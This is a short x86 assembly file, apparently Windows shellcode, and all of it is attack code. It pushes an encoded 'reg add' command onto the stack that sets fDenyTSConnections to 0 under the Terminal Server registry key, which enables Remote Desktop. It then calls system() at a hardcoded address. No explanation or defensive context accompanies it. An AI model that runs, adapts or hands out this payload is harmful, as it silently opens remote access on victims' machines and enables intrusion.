[BITS 32]

global _start			

section .text
_start:

    xor edx, edx	; zero out edx
    push edx		; push null byte onto stack
    
    ; 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
    push 0x662f2030
    push 0x20642f20
    push 0x44524f57
    push 0x445f4745
    push 0x5220742f
    push 0x20736e6f
    push 0x69746365
    push 0x6e6e6f43
    push 0x5354796e
    push 0x65446620
    push 0x762f2022
    push 0x72657672
    push 0x6553206c
    push 0x616e696d
    push 0x7265545c
    push 0x6c6f7274
    push 0x6e6f435c
    push 0x7465536c
    push 0x6f72746e
    push 0x6f43746e
    push 0x65727275
    push 0x435c4d45
    push 0x54535953
    push 0x5c454e49
    push 0x4843414d
    push 0x5f4c4143
    push 0x4f4c5f59
    push 0x454b4822
    push 0x20646461
    push 0x20676572

    mov ebx, esp	; save stack pointer 

    push ebx		; push stack pointer
    mov edx, 0x77c293c7	; mov address of system
    call edx
